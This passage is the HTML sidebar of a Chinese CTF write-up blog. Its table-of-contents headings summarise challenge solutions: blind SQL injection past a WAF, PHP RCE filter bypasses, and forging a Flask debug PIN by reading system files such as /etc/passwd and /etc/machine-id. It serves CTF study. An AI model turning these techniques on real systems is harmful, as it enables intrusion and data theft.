href="#%E6%8C%89%E5%AE%8C%E5%90%8E%E8%BF%9B%E5%85%A5url%E4%B8%BA-search-php-id-1-2-3-4-5-%E8%BF%99%E4%BA%94%E4%B8%AA%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%BE%88%E6%98%8E%E6%98%BE%EF%BC%8C%E9%83%BD%E6%B2%A1%E6%9C%89flag%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B9%8B%E5%89%8D%E5%81%9A%E8%BF%87%E4%B8%80%E4%B8%AAsql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E9%A2%98%EF%BC%8C%E4%B9%9F%E6%98%AF%E5%AD%98%E5%9C%A81%E5%92%8C2%E8%BF%99%E7%A7%8D%E4%B8%A4%E4%B8%AA%E4%BB%A5%E4%B8%8A%E4%B8%8D%E5%90%8C%E5%9B%9E%E6%98%BE%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8if%E8%AF%AD%E5%8F%A5%E5%88%86%E5%88%AB%E8%B7%B3%E8%BD%AC%E5%88%B0%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E5%88%A4%E6%96%ADascii%E5%80%BC%EF%BC%8C%E6%89%80%E4%BB%A5%E7%8C%9C%E6%B5%8Bid%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">32.0.2.</span> <span class="toc-text">按完后进入url为&#x2F;search.php?id&#x3D;1,2,3,4,5 这五个页面，很明显，都没有flag，但是之前做过一个sql布尔盲注题，也是存在1和2这种两个以上不同回显的页面，可以利用if语句分别跳转到两个页面判断ascii值，所以猜测id存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E8%AF%95%E4%B8%80%E4%B8%8B-id-1%E2%80%99%EF%BC%8C%E5%9B%9E%E6%98%BE%E5%8F%98%E4%B8%BAerror%EF%BC%81%EF%BC%88%E8%BF%99%E9%87%8C%E5%9B%9E%E6%98%BE%E7%9A%84error%EF%BC%81%E4%BB%A3%E8%A1%A8sql%E8%AF%AD%E5%8F%A5%E6%8A%A5%E9%94%99%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%9B%9E%E6%98%BE%E7%9A%84error%EF%BC%81%EF%BC%81%EF%BC%81%E4%BB%A3%E8%A1%A8id%E6%9C%AA%E6%9F%A5%E8%AF%A2%E5%88%B0%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%BA%94%E8%AF%A5%E6%98%AF%E8%BF%99%E6%A0%B7%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AF%95%E4%B8%80%E4%B8%8B%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89waf%EF%BC%8C%E5%9B%9E%E6%98%BE%E4%B8%BA%E5%8F%AF%E5%88%AB%E8%AE%A9%E6%88%91%E9%80%AE%E4%BD%8F%E4%BA%86%EF%BC%8C%E5%85%88fuzz%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">32.0.3.</span> <span class="toc-text">先试一下?id&#x3D;1’，回显变为error！（这里回显的error！代表sql语句报错，后面回显的error！！！代表id未查询到，猜测应该是这样），然后试一下常规注入，发现有waf，回显为可别让我逮住了，先fuzz测试一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-%E7%A9%BA%E6%A0%BC-union-%EF%BC%8Cif%E7%AD%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%9B%A0%E4%B8%BA%E2%80%93-%E5%92%8C-%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%BD%86-%E6%B2%A1%E6%9C%89%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%B8%BA%E4%BA%86%E9%81%BF%E5%85%8D%E9%97%AD%E5%90%88%E9%97%AE%E9%A2%98%E5%92%8Cif%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%89%E7%94%A8-%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%9B%A0%E4%B8%BA0-0-0-0-1-1%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E9%80%89%E7%94%A8-id-0-%E5%88%A4%E6%96%AD%E8%AF%AD%E5%8F%A5"><span class="toc-number">32.0.4.</span> <span class="toc-text">过滤了+,#,空格,union,&#x2F;**&#x2F;，if等，这里因为–+和#都被过滤，但^没有被过滤，为了避免闭合问题和if被过滤的问题，我们选用^来进行布尔盲注,因为0^0&#x3D;0,0^1&#x3D;1，所以我们选用?id&#x3D;0^(判断语句)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%8F%91%E7%8E%B0-100%E4%B8%BA%E6%AD%A3%E5%B8%B8%E5%9B%9E%E6%98%BE1%E5%AF%B9%E5%BA%94%E7%9A%84%E9%A1%B5%E9%9D%A2NO-Not-this-Click-others"><span class="toc-number">32.0.5.</span> <span class="toc-text">先尝试一下，发现&gt;100为正常回显1对应的页面NO! Not this! Click others~~~,&lt;100为error！！！，所以可以布尔盲注，直接写个二分法脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E4%B8%BAgeek%EF%BC%8C%E5%86%8D%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D%E4%B8%BAF1naI1y-Flaaaaag%EF%BC%8C%E7%84%B6%E5%90%8E%E7%88%86%E7%A0%B4Flaaaaag%E9%87%8C%E9%9D%A2%E7%9A%84%E5%88%97%E5%90%8D%E4%B8%BAid-fl4gawsl%EF%BC%8C%E6%9C%80%E5%90%8E%E7%88%86%E7%A0%B4fl4gawsl%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%BANO%EF%BC%81%E4%B8%8D%E6%98%AF%E5%93%A5%E4%BB%AC"><span class="toc-number">32.0.6.</span> <span class="toc-text">首先爆破数据库名为geek，再爆破表名为F1naI1y,Flaaaaag，然后爆破Flaaaaag里面的列名为id,fl4gawsl，最后爆破fl4gawsl的数据，发现为NO！不是哥们</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%A3%E5%B0%B1%E6%98%AFflag%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C%E4%BA%86%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C%E4%BD%A0%E8%B5%B7%E8%BF%99%E5%90%8D%E5%AD%97%E6%81%B6%E5%BF%83%E4%BA%BA"><span class="toc-number">32.0.7.</span> <span class="toc-text">那就是flag不在这里了不在这里你起这名字恶心人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%86%8D%E5%8E%BB%E7%88%86%E7%A0%B4%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AA%E8%A1%A8F1naI1y%EF%BC%8C%E7%88%86%E7%A0%B4%E5%87%BA%E5%88%97%E5%90%8D%E4%B8%BAid-username-password%EF%BC%8C%E7%84%B6%E5%90%8E%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%EF%BC%88%E8%BF%99%E9%87%8C%E6%9C%80%E5%A5%BD%E5%9C%A8concat%E6%97%B6%E7%94%A8-%E5%B0%86%E4%B8%89%E4%B8%AA%E5%85%83%E7%B4%A0%E5%88%86%E5%BC%80%EF%BC%8C%E8%BF%99%E9%87%8C%E6%87%92%E5%BE%97%E5%86%8D%E8%B7%91%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E4%BA%86%EF%BC%89"><span class="toc-number">32.0.8.</span> <span class="toc-text">所以我们再去爆破另外一个表F1naI1y，爆破出列名为id,username,password，然后爆破数据（这里最好在concat时用~将三个元素分开，这里懒得再跑一次脚本了）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E5%BE%85%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%E5%9C%A8%E7%AC%AC9%E4%B8%AApassword%E9%87%8C%E9%9D%A2%E5%8F%91%E7%8E%B0flag"><span class="toc-number">32.0.9.</span> <span class="toc-text">等待一段时间后在第9个password里面发现flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">33.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AARCE%E7%9A%84%E9%A2%98%EF%BC%8C%E9%99%90%E5%88%B6%E5%BE%88%E5%A4%9A"><span class="toc-number">33.0.1.</span> <span class="toc-text">一个RCE的题，限制很多</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%99%BD%E5%90%8D%E5%8D%95%E5%87%BD%E6%95%B0%E4%B8%AD%E6%9C%89base-convert%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%9C%E7%94%A8%E4%B8%BA%E8%BD%AC%E6%8D%A2%E8%BF%9B%E5%88%B6%EF%BC%8C%E4%B8%94%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%812%E8%BF%9B%E5%88%B6%E5%88%B036%E8%BF%9B%E5%88%B6%E7%9A%84%E8%BD%AC%E6%8D%A2%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%A5%E5%87%BD%E6%95%B0%E7%94%A8%E6%95%B0%E5%AD%97%E8%8E%B7%E5%BE%97%E6%89%80%E6%9C%89%E5%AD%97%E6%AF%8D"><span class="toc-number">33.0.2.</span> <span class="toc-text">在白名单函数中有base_convert函数，作用为转换进制，且最多支持2进制到36进制的转换，也就是我们可以通过该函数用数字获得所有字母</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E6%83%B3%E7%9B%B4%E6%8E%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%9D%E6%88%91%E4%BB%AC%E6%B2%A1%E6%9C%89%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E4%B9%9F%E9%9A%BE%E4%BB%A5%E7%BB%95%E8%BF%87%EF%BC%8C%E9%A1%B6%E5%A4%9A%E5%8F%AA%E8%83%BD%E6%89%A7%E8%A1%8C%E5%83%8Fphpinfo-system-ls-%E8%BF%99%E7%A7%8D%E6%97%A0%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">33.0.3.</span> <span class="toc-text">但是想直接代码执行的话我们没有空格，常规绕过也难以绕过，顶多只能执行像phpinfo(),system(ls)这种无空格的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%9E%84%E9%80%A0%E5%87%BA%E7%A9%BA%E6%A0%BC%E6%9D%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84dechex-%E5%B0%86%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E4%B8%BA16%E8%BF%9B%E5%88%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E7%94%A8base-convert%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%87%BAhex2bin-%E5%87%BD%E6%95%B0%E5%B0%8616%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E4%B8%BAascii%E7%A0%81"><span class="toc-number">33.0.4.</span> <span class="toc-text">所以我们要想办法构造出空格来，这里可以通过用白名单中的dechex()将十进制转换为16进制，然后再用base_convert函数构造出hex2bin()函数将16进制转换为ascii码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%9E%84%E9%80%A0%E6%97%B6%E5%8F%91%E7%8E%B0%E5%AD%97%E6%95%B0%E8%B6%85%E8%BF%8780%E4%B8%AA%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E8%A6%81%E5%BC%95%E5%85%A5%E5%8A%A8%E6%80%81-%E5%8F%AF%E5%8F%98-%E5%87%BD%E6%95%B0"><span class="toc-number">33.0.5.</span> <span class="toc-text">然后在进行构造时发现字数超过80个，这里就要引入动态(可变)函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84pi%E4%BD%9C%E4%B8%BA%E5%8F%98%E9%87%8F%E5%90%8D%E6%9D%A5%E8%8A%82%E7%BA%A6%E7%A9%BA%E9%97%B4"><span class="toc-number">33.0.6.</span> <span class="toc-text">这里就可以用白名单中的pi作为变量名来节约空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0-GET%E8%AF%B7%E6%B1%82%E6%9D%A5%E7%AA%81%E7%A0%B4%E5%AD%97%E6%95%B0%E9%99%90%E5%88%B6"><span class="toc-number">33.0.7.</span> <span class="toc-text">另外一种方法就是可以通过构造$_GET请求来突破字数限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87getallheaders%E5%88%A9%E7%94%A8HeaderRCE"><span class="toc-number">33.0.8.</span> <span class="toc-text">还可以通过getallheaders利用HeaderRCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E4%B9%9F%E6%98%AF%E6%9C%80%E8%83%BD%E5%87%8F%E5%B0%91%E5%AD%97%E6%95%B0%E7%9A%84%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87%E5%88%A9%E7%94%A8%E5%BC%82%E6%88%96%E5%BE%97%E5%88%B0%E5%87%BD%E6%95%B0%E5%90%8D%E5%92%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">33.0.9.</span> <span class="toc-text">最后也是最能减少字数的就是通过利用异或得到函数名和命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">34.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%8E%BB%E4%B9%8B%E5%90%8E%E7%BB%99%E4%BA%86%E6%BA%90%E7%A0%81%EF%BC%8C%E6%98%AF%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%94%A8%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E6%88%96%E8%80%85%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%E9%83%BD%E5%8F%AF%E4%BB%A5"><span class="toc-number">34.0.1.</span> <span class="toc-text">进去之后给了源码，是无字母数字RCE，这个用异或绕过或者取反绕过都可以</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">35.</span> <span class="toc-text">Hello,&#39;.$_POST[&#39;username&#39;].&#39;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%E4%B8%BAthis-is-the-flag-txt-%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E5%8F%91%E7%8E%B0flag%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%94%A8-1-%E8%BF%9B%E8%A1%8C%E5%AD%97%E7%AC%A6%E5%80%92%E8%BD%AC%E8%BE%93%E5%87%BA"><span class="toc-number">35.0.1.</span> <span class="toc-text">得到flag文件夹名为this_is_the_flag.txt,直接读取发现flag被过滤，用[::-1]进行字符倒转输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag-4"><span class="toc-number">35.0.2.</span> <span class="toc-text">得到flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hint%E7%95%8C%E9%9D%A2%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%9C%89%E4%B8%AApin%E7%9A%84%E5%AD%97%E6%A0%B7%EF%BC%8C%E5%90%8C%E6%97%B6%E5%9C%A8%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E9%94%99%E8%AF%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E6%97%B6%E4%BC%9A%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%BB%A3%E8%A1%A8%E5%BC%80%E5%90%AF%E4%BA%86debug%E6%A8%A1%E5%BC%8F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%94%9F%E6%88%90pin%E7%A0%81%E6%9D%A5%E8%BF%9B%E5%85%A5%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">35.0.3.</span> <span class="toc-text">hint界面源代码中有个pin的字样，同时在我们输入错误的数据时会回显报错界面，代表开启了debug模式，所以我们可以通过生成pin码来进入调试模式进行命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%81%E7%94%9F%E6%88%90pin%E7%A0%81%EF%BC%8C%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%E4%BF%A1%E6%81%AF"><span class="toc-number">35.0.4.</span> <span class="toc-text">要生成pin码，我们需要知道以下几个信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89flask%E6%89%80%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96-etc-password%E7%9F%A5%E9%81%93-%E7%94%A8%E6%88%B7%E4%B8%BAflaskweb"><span class="toc-number">35.0.4.1.</span> <span class="toc-text">（1）flask所登录的用户名。可以通过读取&#x2F;etc&#x2F;password知道 用户为flaskweb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-modname-%E4%B8%80%E8%88%AC%E4%B8%8D%E5%8F%98%E5%B0%B1%E6%98%AFflask-app"><span class="toc-number">35.0.4.2.</span> <span class="toc-text">(2) modname 一般不变就是flask.app</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-getattr-app-%E2%80%9Cname%E2%80%9D-app-class-name-%E3%80%82python%E8%AF%A5%E5%80%BC%E4%B8%80%E8%88%AC%E4%B8%BAFlask-%EF%BC%8C%E5%80%BC%E4%B8%80%E8%88%AC%E4%B8%8D%E5%8F%98"><span class="toc-number">35.0.4.3.</span> <span class="toc-text">(3)getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-flask%E5%BA%93%E4%B8%8Bapp-py%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E3%80%82%E5%9C%A8%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E4%B8%AD%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E6%AD%A4%E5%80%BC%E4%B8%BA%EF%BC%9A-usr-local-lib-python3-7-site-packages-flask-app-py"><span class="toc-number">35.0.4.4.</span> <span class="toc-text">(4)flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%BD%93%E5%89%8D%E7%BD%91%E7%BB%9C%E7%9A%84mac%E5%9C%B0%E5%9D%80%E7%9A%84%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E3%80%82%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6-sys-class-net-eth0-address%E8%AF%BB%E5%8F%96%EF%BC%8Ceth0%E4%B8%BA%E5%BD%93%E5%89%8D%E4%BD%BF%E7%94%A8%E7%9A%84%E7%BD%91%E5%8D%A1%EF%BC%9A"><span class="toc-number">35.0.4.5.</span> <span class="toc-text">(5)当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-docker%E6%9C%BA%E5%99%A8id"><span class="toc-number">35.0.4.6.</span> <span class="toc-text">(6)docker机器id</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E9%9D%9Edocker%E6%9C%BA%E6%AF%8F%E4%B8%80%E4%B8%AA%E6%9C%BA%E5%99%A8%E9%83%BD%E4%BC%9A%E6%9C%89%E8%87%AA%E5%B7%B2%E5%94%AF%E4%B8%80%E7%9A%84id%EF%BC%8Clinux%E7%9A%84id%E4%B8%80%E8%88%AC%E5%AD%98%E6%94%BE%E5%9C%A8-etc-machine-id%E6%88%96-proc-sys-kernel-random-boot-i%EF%BC%8C%E6%9C%89%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E3%80%82"><span class="toc-number">35.0.4.7.</span> <span class="toc-text">对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8Edocker%E6%9C%BA%E5%88%99%E8%AF%BB%E5%8F%96-proc-self-cgroup%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%AC%AC%E4%B8%80%E8%A1%8C%E7%9A%84-docker-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%90%8E%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E4%BD%9C%E4%B8%BA%E6%9C%BA%E5%99%A8%E7%9A%84id%EF%BC%8C"><span class="toc-number">35.0.4.8.</span> <span class="toc-text">对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90pin%E7%A0%81"><span class="toc-number">35.0.5.</span> <span class="toc-text">生成pin码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pin%E7%A0%81%E8%BE%93%E5%85%A5%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BF%9B%E5%85%A5%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag%EF%BC%9A"><span class="toc-number">35.0.6.</span> <span class="toc-text">pin码输入控制台进入交互式shell，执行命令即可得到flag：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">36.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%98%AFputenv-PATH-home-rceservice-jail-%EF%BC%8C%E6%84%8F%E5%91%B3%E7%9D%80%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E5%8E%BB%E8%B0%83%E7%94%A8cat%E7%AD%89%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%BA%9B%E5%91%BD%E4%BB%A4%E5%AE%9E%E9%99%85%E4%B8%8A%E6%98%AF%E5%AD%98%E6%94%BE%E5%9C%A8%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%B0%81%E8%A3%85%E5%A5%BD%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8CPATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%B0%B1%E6%98%AF%E5%AD%98%E6%94%BE%E8%BF%99%E4%BA%9B%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95%E7%9A%84%E8%B7%AF%E5%BE%84%E6%96%B9%E4%BE%BF%E6%88%91%E4%BB%AC%E5%8E%BB%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E8%BF%99%E4%BA%9B%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%80%E4%BB%A5%E6%AD%A4%E5%A4%84%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E6%88%91%E4%BB%AC%E5%BE%97%E4%BD%BF%E7%94%A8%E5%85%B6%E5%AD%98%E6%94%BE%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%8E%BB%E8%B0%83%E7%94%A8"><span class="toc-number">36.0.1.</span> <span class="toc-text">首先是putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);，意味着我们无法直接去调用cat等命令，因为这些命令实际上是存放在特定目录中封装好的程序，PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令，所以此处部分命令我们得使用其存放的绝对路径去调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%98%AFjson%E6%A0%BC%E5%BC%8F"><span class="toc-number">36.0.2.</span> <span class="toc-text">然后是json格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E6%98%AF%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">36.0.3.</span> <span class="toc-text">最后是正则绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E5%9B%A0%E4%B8%BApreg-match%E5%8F%AA%E8%83%BD%E5%8C%B9%E9%85%8D%E7%AC%AC%E4%B8%80%E8%A1%8C%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E9%87%87%E7%94%A8%E5%A4%9A%E8%A1%8C%E7%BB%95%E8%BF%87%E3%80%82"><span class="toc-number">36.0.4.</span> <span class="toc-text">解法一：因为preg_match只能匹配第一行，所以这里可以采用多行绕过。</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/28/22%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3/" title="22网鼎半决">22网鼎半决</a><time datetime="2025-08-28T15:20:58.000Z" title="发表于 2025-08-28 23:20:58">2025-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/24/Delegation/" title="Delegation">Delegation</a><time datetime="2025-08-24T15:20:58.000Z" title="发表于 2025-08-24 23:20:58">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/23/Lilctf/" title="Lilctf">Lilctf</a><time datetime="2025-08-23T15:20:58.000Z" title="发表于 2025-08-23 23:20:58">2025-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/20/exchange/" title="exchange">exchange</a><time datetime="2025-08-20T15:20:58.000Z" title="发表于 2025-08-20 23:20:58">2025-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/nepctf/" title="nepctf">nepctf</a><time datetime="2025-08-17T15:20:58.000Z" title="发表于 2025-08-17 23:20:58">2025-08-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/789.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By xianxin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a 